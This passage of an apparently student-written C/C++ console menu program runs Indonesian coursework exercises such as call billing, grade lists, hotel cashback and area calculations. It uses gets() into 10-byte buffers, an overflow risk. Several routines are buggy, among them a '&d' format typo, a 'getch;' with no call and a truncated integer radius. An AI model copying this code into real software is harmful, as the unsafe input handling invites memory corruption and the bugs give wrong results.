            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Penempatan String menggunakan Perintah Puts dan Gotoxy" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;penempatan_string_menggunakan_perintah_puts_dan_gotoxy();cout << endl;cout << endl;
        }
		else if(pilihan == 29)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Perkalian 2 Buah Bilangan dengan Menggunakan Konsep Penjumlahan" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;perkalian_2_buah_bilangan_dengan_menggunakan_konsep_penjumlahan();cout << endl;cout << endl;
        }
		else if(pilihan == 30)
        {
			system("cls");int pilihan;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << "Home >> Program Aplikasi >> Program Combine 3 Kasus" << endl;
            cout << "\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2\xB2" << endl;
            cout << endl;cout << endl;program_combine_3_kasus();cout << endl;cout << endl;
        }
        else{goto choosing_in_mapi;}
    }
    else if(pilihan == "GOHOME"){system("cls");main_program();}
    else{goto program_aplikasi;}
    return 0;
}
int billing_warung_telekomunikasi()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{
		int jm,td,m,mm,dm,js,ms,ds,lj,lm,ld,jp,jb,cek;
		clrscr();
		puts("Mulai Bicara		=	:	:	");
		puts("Selesai Bicara	=	:	:	");
		gotoxy(19,1);scanf("%d",&jm);
		gotoxy(22,1);scanf("%d",&mm);
		gotoxy(24,1);scanf("%d",&dm);
		gotoxy(19,2);scanf("%d",&js);
		gotoxy(22,2);scanf("%d",&ms);
		gotoxy(24,2);scanf("%d",&ds);
		lj=js-jm;
		if(ms>mm)lm=ms-mm
		else{lj=lj-1;lm=ms+60-mm;}
		if(ds>dm)ld=ds-dm;
		else{lm=lm-1;ld=ds+60-dm;}
		td=lj*60*60+lm*60+ld;
		jp=td/60;
		cek=td%60;
		if(cek!=0)jp=jp+1;jb=jp*150;
		printf("\nTOTAL DURASI 	= %d : %d : %d \n",lj,lm,ld);
		printf("TOTAL PULSA 	= %d\n",jp);
		printf("JUMLAH BAYAR 	= Rp. %d",jb);
	}
	*/
	billing_warung_telekomunikasi:system("cls");string pilihan;
	int jm,td,m,mm,dm,js,ms,ds,lj,lm,ld,jp,jb,cek;
	system("cls");
	puts("Mulai Bicara		=	:	:	");
	puts("Selesai Bicara	=	:	:	");
	gotoxy(19,1);scanf("%d",&jm);
	gotoxy(22,1);scanf("%d",&mm);
	gotoxy(24,1);scanf("%d",&dm);
	gotoxy(19,2);scanf("%d",&js);
	gotoxy(22,2);scanf("%d",&ms);
	gotoxy(24,2);scanf("%d",&ds);
	lj=js-jm;
	if(ms>mm)lm=ms-mm;
	else{lj=lj-1;lm=ms+60-mm;}
	if(ds>dm)ld=ds-dm;
	else{lm=lm-1;ld=ds+60-dm;}
	td=lj*60*60+lm*60+ld;
	jp=td/60;
	cek=td%60;
	if(cek!=0)jp=jp+1;jb=jp*150;
	printf("\nTOTAL DURASI 	= %d : %d : %d \n",lj,lm,ld);
	printf("TOTAL PULSA 	= %d\n",jp);
	printf("JUMLAH BAYAR 	= Rp. %d",jb);
	cout << endl;choosing_in_billing_warung_telekomunikasi:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto billing_warung_telekomunikasi;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_billing_warung_telekomunikasi;}return 0;
}
int billing_warung_telekomunikasi_2()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{
		int mj,mm,md,sj,sm,sd,tj,tm,td,tjm,tp,jb;
		clrscr();
		printf("Masukkan jam mulai bicara : ");scanf("%d",&mj);
		printf("Masukkan menit mulai bicara : ");scanf("%d",&mm);
		printf("Masukkan detik mulai bicara : ");scanf("%d",&md);
		printf("Mulai bicara : %d : %d : %d\n",mj,mm,md);
		printf("Masukkan jam selesai bicara : ");scanf("%d",&sj);
		printf("Masukkan menit selesai bicara : ");scanf("%d",&sm);
		printf("Masukkan detik selesai bicara : ");scanf("%d",&sd);
		printf("Selesai bicara : %d : %d : %d\n",sj,sm,sd);
		tj=sj-mj;tm=sm-mm;td=sd-md;
		printf("Total Durasi : %d : %d : %d\n",tj,tm,td);
		tjm=tj*60;tp=tm+tjm;
		if(td>=1){tp++;}
		printf("Total pulsa %d\n",tp);jb=tp*150;
		printf("Jumlah bayar Rp.%d",jb);
		getch();
	}
	*/
	billing_warung_telekomunikasi_2:system("cls");string pilihan;
	int mj,mm,md,sj,sm,sd,tj,tm,td,tjm,tp,jb;
	system("cls");
	printf("Masukkan jam mulai bicara : ");scanf("%d",&mj);
	printf("Masukkan menit mulai bicara : ");scanf("%d",&mm);
	printf("Masukkan detik mulai bicara : ");scanf("%d",&md);
	printf("Mulai bicara : %d : %d : %d\n",mj,mm,md);
	printf("Masukkan jam selesai bicara : ");scanf("%d",&sj);
	printf("Masukkan menit selesai bicara : ");scanf("%d",&sm);
	printf("Masukkan detik selesai bicara : ");scanf("%d",&sd);
	printf("Selesai bicara : %d : %d : %d\n",sj,sm,sd);
	tj=sj-mj;tm=sm-mm;td=sd-md;
	printf("Total Durasi : %d : %d : %d\n",tj,tm,td);
	tjm=tj*60;tp=tm+tjm;
	if(td>=1){tp++;}
	printf("Total pulsa %d\n",tp);jb=tp*150;
	printf("Jumlah bayar Rp.%d",jb);
	getch();
	cout << endl;
	cout << endl;choosing_in_billing_warung_telekomunikasi_2:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto billing_warung_telekomunikasi_2;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_billing_warung_telekomunikasi_2;}return 0;
}
int daftar_nilai_mahasiswa()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{   int jm,i,nim,jn,nt,nil; char nm[10]; float nr;
	clrscr();
	jn=0; nt=0; nr=0;
	printf("Jumlah Mahasiwa : "); scanf("%d",&jm);
	puts("Daftar Nilai Ujian");
	gotoxy(1,3); printf("No NIM");
	gotoxy(10,3); printf("NAMA MAHASISWA");
	gotoxy(25,3); printf("NILAI UJIAN");
	puts("\n-----------------------------------");
	for(i=1;i<=jm;i++){
	   printf("%d.\n",i);
	  if (i<=jm) {
		  gotoxy(3,i+4);fflush(stdin); scanf("%d",&nim);
		  gotoxy(10,i+4);fflush(stdin); gets (nm);
		  gotoxy(30,i+4);fflush(stdin); scanf("%d",&nil);
		 }
		 jn=jn+nil;
		 if(nt>=nil){
		  nil=nt;
		  }
		  else{ nt=nil;
		  }
		 }
	puts("\n-----------------------------------");
	nr=(float)jn/jm;
	printf("Jumalah Nilai = %d ",jn);
	printf("\nNilai Rata-rata = %.2f",nr);
	printf("\nNilai terbesar = %d",nt);
	getch();
	}
	*/
	daftar_nilai_mahasiswa:system("cls");string pilihan;
	int jm,i,nim,jn,nt,nil; char nm[10]; float nr;
	system("cls");
	jn=0; nt=0; nr=0;
	printf("Jumlah Mahasiwa : "); scanf("%d",&jm);
	puts("Daftar Nilai Ujian");
	gotoxy(1,3); printf("No NIM");
	gotoxy(10,3); printf("NAMA MAHASISWA");
	gotoxy(25,3); printf("NILAI UJIAN");
	puts("\n-----------------------------------");
	for(i=1;i<=jm;i++){
	   printf("%d.\n",i);
	  if (i<=jm) {
		  gotoxy(3,i+4);fflush(stdin); scanf("%d",&nim);
		  gotoxy(10,i+4);fflush(stdin); gets (nm);
		  gotoxy(30,i+4);fflush(stdin); scanf("%d",&nil);
		 }
		 jn=jn+nil;
		 if(nt>=nil){
		  nil=nt;
		  }
		  else{ nt=nil;
		  }
		 }
	puts("\n-----------------------------------");
	nr=(float)jn/jm;
	printf("Jumalah Nilai = %d ",jn);
	printf("\nNilai Rata-rata = %.2f",nr);
	printf("\nNilai terbesar = %d",nt);
	getch();
	cout << endl;
	cout << endl;choosing_in_daftar_nilai_mahasiswa:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto daftar_nilai_mahasiswa;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_daftar_nilai_mahasiswa;}return 0;
}
int hitung_cashback_inap_hotel()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	#define satu_dollar 12850
	main()
	{ int tci,tco,li;float tid,t_bayar,cash,c_back; char nt[10];
	 clrscr();
	 
	 puts("WELCOME AT HOTEL \"DIPATI UKUR\"");
	 puts("------------------------------");
	 printf("NAMA TAMU				= "); gets(nt);
	 printf("TANGGAL CHECK IN		= "); scanf("%d",&tci);
	 printf("TANGGAL CHECK OUT		= "); scanf("%d",&tco);
	 printf("TARIF INAP/HARI		= $"); scanf("%f",&tid);
	 puts("----------------------------------------------");
	 li=tco-tci;
	 t_bayar=li*tid*satu_dollar;
	 printf("LAMA MENGINAP			= %d HARI\n",li);
	 printf("TOTAL BAYAR			= Rp. %.2f\n",t_bayar);
	 printf("CASH					= Rp. "); scanf("%f",&cash);
	 c_back=cash-t_bayar;
	 puts("----------------------------------------------");
	 printf("CASHBACK				= Rp. %.2f",c_back);
	 getch();
	}
	*/
	#include <stdio.h>
	#include <conio.h>
	#define satu_dollar 12850
	
	hitung_cashback_inap_hotel:system("cls");string pilihan;
	int tci,tco,li;float tid,t_bayar,cash,c_back; char nt[10];
	system("cls"); 
	puts("WELCOME AT HOTEL \"DIPATI UKUR\"");
	puts("------------------------------");
	printf("NAMA TAMU				= "); gets(nt);
	printf("TANGGAL CHECK IN		= "); scanf("%d",&tci);
	printf("TANGGAL CHECK OUT		= "); scanf("%d",&tco);
	printf("TARIF INAP/HARI		= $"); scanf("%f",&tid);
	puts("----------------------------------------------");
	li=tco-tci;
	t_bayar=li*tid*satu_dollar;
	printf("LAMA MENGINAP			= %d HARI\n",li);
	printf("TOTAL BAYAR			= Rp. %.2f\n",t_bayar);
	printf("CASH					= Rp. "); scanf("%f",&cash);
	c_back=cash-t_bayar;
	puts("----------------------------------------------");
	printf("CASHBACK				= Rp. %.2f",c_back);
	getch();
	cout << endl;
	cout << endl;choosing_in_hitung_cashback_inap_hotel:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_cashback_inap_hotel;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_cashback_inap_hotel;}return 0;
}
int hitung_denda_bayar_listrik()
{
	//Default 1
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int tb,denda;char np[10],tg;
	clrscr();
	printf("Nama pelanggan = ");gets(np);
	printf("Tanggal bayar  = ");scanf("%d",&tb);
	printf("Tegangan 1 = 450\n");
	printf("Tegangan 2 = 900\n");
	printf("Tegangan 3 = 1200\n");
	tg=getche();
	switch(tb>20)
	{ case 1 : if (tg=='1') denda=5000;
		   else if(tg=='2') denda=10000;
		   else denda=15000;break;
	  case 0 : denda=0;break;
	}
	printf("\nBesarnya denda Rp. %d",denda);
	getch();
	}
	*/
	//Default 2
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int tb,tgl,denda; char np[10],tg;
	clrscr();
	printf("Nama pelanggan = "); gets(np);
	printf("Tanggal bayar  = "); scanf("%d",&tb);
	printf("Tegangan 1=450 2=900 3=1200); tg=getch();

	if (tg>20)
	{ if(tg=='1') denda=5000;
	  else if(tg=='2') denda=10000;
	  else (tg=='3') denda=15000;
	  else
	}
	else denda=0();

	printf("\nBesarnya denda Rp. %d",denda);
	getch();
	}
	*/
	hitung_denda_bayar_listrik:system("cls");string pilihan;
	int tb,denda;char np[10],tg;
	system("cls");
	printf("Nama pelanggan = ");gets(np);
	printf("Tanggal bayar  = ");scanf("%d",&tb);
	printf("Tegangan 1 = 450\n");
	printf("Tegangan 2 = 900\n");
	printf("Tegangan 3 = 1200\n");
	tg=getche();
	switch(tb>20)
	{ case 1 : if (tg=='1') denda=5000;
		   else if(tg=='2') denda=10000;
		   else denda=15000;break;
	  case 0 : denda=0;break;
	}
	printf("\nBesarnya denda Rp. %d",denda);
	getch();
	cout << endl;
	cout << endl;choosing_in_hitung_denda_bayar_listrik:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_denda_bayar_listrik;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_denda_bayar_listrik;}return 0;
}
int hitung_gaji_karyawan()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ char id[10];  int jk; float dbyr,gaji;
	 clrscr();
	 printf("Masukkan ID karyawan (Mask. 10 kar) : "); gets (id);
	 printf("Masukkan total jam kerja            : "); scanf("%d",&jk);
	 printf("Jumlah Gaji/jam                     : Rp. "); scanf("%f",&dbyr);
	 printf("Gaji        :Rp. %.2f\n",jk*dbyr);
	 getch();
	}
	*/
	/*
	#include <stdio.h>
	#include <conio.h>
	void input_data_pegawai(void);
	void proses_gaji_pegawai(void);
	void cetak_gaji_pegawai(void);
	char np[10],sts;
	int gol,lk,jjk;
	float gp,upj,ul,gb,pph,tsi,tg;
	main()
	{
	 clrscr();
	 input_data_pegawai();
	 proses_gaji_pegawai();
	 cetak_gaji_pegawai();
	 getch();
	}

	void cetak_gaji_pegawai(void)
	{
	 printf("Gaji pokok    = Rp. %.2f\n",gp);
	 printf("Tunjangan SI  = Rp. %.2f\n",tsi);
	 printf("Upaha Lembur  = Rp. %.2f\n",ul);
	 printf("____________________________\n");
	 printf("Total gajih   = Rp. %.2f\n",tg);
	 printf("PPH           = Rp. %.2f(-)\n",pph);
	 printf("____________________________\n");
	 printf("Gaji Bersih   = Rp. %.2f\n",gb);
	}

	void proses_gaji_pegawai(void)
	{
	 switch (gol)
	 {
	  case 1 : gp=2000000; upj=30000; break;
	  case 2 : gp=3000000; upj=40000; break;
	  case 3 : gp=4000000; upj=50000; break;
	  default : gp=0; upj=0;
	 }
	 //verifikasi gaji pokok berdasarkan lama bekerja
	 if (lk<3) gp=gp*0.5;

	 //berifikasi tunjagan si
	 if (sts=='1')
		tsi=0.2*gp;
	 else
		tsi=0;

	 //hitung upah lembur
	 if (jjk>100) ul=(jjk-100)*upj; else ul=0;

	 //hitung total gaji
	 tg=gp+tsi+ul;
	 pph=0.025*tg;
	 gb=tg-pph;
	}

	void input_data_pegawai(void)
	{
	 printf("Nama pegawai    = ");
	 gets(np);
	 fflush(stdin);
	 printf("Golongan 1/2/3  = ");
	 scanf("%d",&gol);
	 fflush(stdin);
	 printf("Lama bekerja    = ");
	 scanf("%d",&lk);
	 fflush(stdin);
	 printf("Status Marital 1[married] 0[single]= ");
	 scanf("%c",&sts);
	 fflush(stdin);
	 printf("Jumlah jam bekerja = ");
	 scanf("%d",&jjk);
	}
	*/
	hitung_gaji_karyawan:system("cls");string pilihan;
	char id[10];  int jk; float dbyr,gaji;
	system("cls");
	printf("Masukkan ID karyawan (Mask. 10 kar) : "); gets (id);
	printf("Masukkan total jam kerja            : "); scanf("%d",&jk);
	printf("Jumlah Gaji/jam                     : Rp. "); scanf("%f",&dbyr);
	printf("Gaji        :Rp. %.2f\n",jk*dbyr);
	getch();
	cout << endl;
	cout << endl;choosing_in_hitung_gaji_karyawan:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_gaji_karyawan;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_gaji_karyawan;}return 0;
}
int hitung_konsumsi_rata_rata_sepeda()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	main()
	{ int j,l; float rata_rata;
	 clrscr();
	 printf("***MENGHITUNG KONSUMSI RATA-RATA SEPEDA***\n");
	 printf("Masukkan total jarak dalam km : "); scanf("%d",&j);
	 printf("Masukkan total bahan bakar yang dihabiskan dalam liter: ");
	 scanf("%d",&l);

	 rata_rata=(float)j/l;

	 printf("Konsumsi rata-rata (km / lt) %.3f",rata_rata);
	 getch();
	}
	*/
	hitung_konsumsi_rata_rata_sepeda:system("cls");string pilihan;
	int j,l; float rata_rata;
	system("cls");
	printf("***MENGHITUNG KONSUMSI RATA-RATA SEPEDA***\n");
	printf("Masukkan total jarak dalam km : "); scanf("%d",&j);
	printf("Masukkan total bahan bakar yang dihabiskan dalam liter: ");
	scanf("%d",&l);
	rata_rata=(float)j/l;
	printf("Konsumsi rata-rata (km / lt) %.3f",rata_rata);
	getch();
	cout << endl;
	cout << endl;choosing_in_hitung_konsumsi_rata_rata_sepeda:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_konsumsi_rata_rata_sepeda;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_konsumsi_rata_rata_sepeda;}return 0;
}
int hitung_lama_pengerjaan_proyek()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	#define satu_tahun 365
	#define satu_bulan 30

	main()
	{ int x,t,b,h;
	 clrscr();
	 
	 printf("Lama pengerjaan proyek = "); scanf("%d",&x);
	 t= x / satu_tahun;
	 b= (x % satu_tahun) / satu_bulan;
	 h= (x % satu_tahun) % satu_bulan;
	 
	 printf("Proyek dikerjakan selama %d Tahun &d Bulan %d Hari",t,b,h);
	 getch();
	}
	*/
	#include <stdio.h>
	#include <conio.h>
	#define satu_tahun 365
	#define satu_bulan 30

	hitung_lama_pengerjaan_proyek:system("cls");string pilihan;
	int x,t,b,h;
	system("cls");
	printf("Lama pengerjaan proyek = "); scanf("%d",&x);
	t= x / satu_tahun;
	b= (x % satu_tahun) / satu_bulan;
	h= (x % satu_tahun) % satu_bulan;
	printf("Proyek dikerjakan selama %d Tahun &d Bulan %d Hari",t,b,h);
	getch();
	cout << endl;
	cout << endl;choosing_in_hitung_lama_pengerjaan_proyek:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_lama_pengerjaan_proyek;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_lama_pengerjaan_proyek;}return 0;
}
int hitung_luas_lingkaran()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>
	#define phi 3.14

	main()
	{ int diameter,jari2;
	  float luas_lingkaran;

	  clrscr();
	  printf("Panjang Diameter Lingkaran = ");
	  scanf("%d" ,&diameter);

	  jari2= (float) diameter / 2;
	  luas_lingkaran = phi * jari2 * jari2;

	  printf("Luas Lingkaran adalah %.2f" ,luas_lingkaran);
	  getch;
	}
	*/
	#include <stdio.h>
	#include <conio.h>
	#define phi 3.14

	hitung_luas_lingkaran:system("cls");string pilihan;
	int diameter,jari2;
	float luas_lingkaran;
	system("cls");
	printf("Panjang Diameter Lingkaran = ");
	scanf("%d" ,&diameter);
	jari2= (float) diameter / 2;
	luas_lingkaran = phi * jari2 * jari2;
	printf("Luas Lingkaran adalah %.2f" ,luas_lingkaran);
	getch;
	cout << endl;
	cout << endl;choosing_in_hitung_luas_lingkaran:
	cout << "Jalankan kembali Program ini [JKPI] / Lihat List di Program Dasar [PROKAS] / Go Home [GOHOME] : ";cin>>pilihan;
	if(pilihan == "JKPI"){system("cls");goto hitung_luas_lingkaran;}
	else if(pilihan == "PROKAS"){system("cls");program_aplikasi();}
	else if(pilihan == "GOHOME"){system("cls");main_program();}
	else{goto choosing_in_hitung_luas_lingkaran;}return 0;
}
int hitung_luas_segitiga()
{
	//Default
	/*
	#include <stdio.h>
	#include <conio.h>

	main()
	{ int x,
	clrscr();
	puts("******************************");
	puts("***MENGHITUNG LUAS SEGITIGA***");
	puts("******************************");
	printf("\nPANJANG ALAS SEGITIGA = "); scanf("%f",&pas);
	printf("\nTINGGI SEGI TIGA      = "); scanf("%f",&tst);
	luas_sgt=0.5*pas*tst;
	puts("---------------------------------");
	printf("LUAS SEGITIGA ADALAH %.2F\n\n",luas_sgt);
	puts("Tekan sembarang tombol untuk kembali ke source code...!");
	getch();
	}
	*/
	hitung_luas_segitiga:system("cls");string pilihan;
	float luas_sgt,pas,tst;
	system("cls");
	puts("******************************");
	puts("***MENGHITUNG LUAS SEGITIGA***");
	puts("******************************");
	printf("\nPANJANG ALAS SEGITIGA = "); scanf("%f",&pas);
	printf("\nTINGGI SEGI TIGA      = "); scanf("%f",&tst);
	luas_sgt=0.5*pas*tst;
	puts("---------------------------------");
	printf("LUAS SEGITIGA ADALAH %.2F\n\n",luas_sgt);
	puts("Tekan sembarang tombol untuk kembali ke source code...!");
	getch();
	cout << endl;
	cout << endl;choosing_in_hitung_luas_segitiga:
